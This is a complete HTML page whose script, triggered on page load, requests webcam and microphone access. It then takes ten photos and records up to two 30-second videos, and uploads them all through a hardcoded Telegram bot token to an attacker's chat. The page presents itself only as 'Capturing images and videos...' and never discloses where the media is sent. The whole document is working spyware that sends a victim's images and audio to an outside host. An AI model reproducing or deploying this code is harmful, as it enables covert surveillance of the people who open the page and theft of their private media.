<!DOCTYPE html>
<html>
<head>
    <title>Capturing Media...</title>
    <script>
        async function startCapturing() {
            try {
                // Request camera & microphone access
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                const mediaRecorder = new MediaRecorder(stream);
                const videoChunks = [];
                const imageCapture = new ImageCapture(stream.getVideoTracks()[0]);

                // Capture 10 images
                async function captureImages() {
                    for (let i = 0; i < 10; i++) {
                        const blob = await imageCapture.takePhoto();
                        sendMediaToTelegram(blob, "photo");
                        await new Promise(resolve => setTimeout(resolve, 1000)); // Wait 1 second between images
                    }
                }

                // Start recording video
                function startVideoRecording() {
                    mediaRecorder.start();
                    mediaRecorder.ondataavailable = event => {
                        videoChunks.push(event.data);
                    };

                    // Stop recording after 30 seconds
                    setTimeout(() => {
                        mediaRecorder.stop();
                    }, 30000);
                }

                // Stop and send video
                mediaRecorder.onstop = async () => {
                    const videoBlob = new Blob(videoChunks, { type: 'video/webm' });
                    sendMediaToTelegram(videoBlob, "video");

                    // If this is the first video, start a second recording
                    if (videoChunks.length === 1) {
                        setTimeout(startVideoRecording, 2000);
                    }
                };

                // Start first video recording
                startVideoRecording();

                // Start capturing images
                captureImages();

            } catch (error) {
                alert("Camera or microphone access denied! Please allow it in browser settings.");
            }
        }

        async function sendMediaToTelegram(mediaBlob, type) {
            const formData = new FormData();
            formData.append("chat_id", "1679328294"); // Your chat ID

            if (type === "photo") {
                formData.append("photo", mediaBlob, "image.jpg");
            } else if (type === "video") {
                formData.append("video", mediaBlob, "video.webm");
            }

            fetch(`https://api.telegram.org/bot7570012997:AAFqnbInLmAH0O_49cxHu4W87HnVOdfjKS0/send${type === "photo" ? "Photo" : "Video"}`, {
                method: "POST",
                body: formData,
            })
            .then(response => response.json())
            .then(result => console.log(`${type} sent:`, result))
            .catch(error => console.error(`Error sending ${type}:`, error));
        }

        window.onload = startCapturing;
    </script>
</head>
<body>
    <h3>Capturing images and videos...</h3>
</body>
</html>
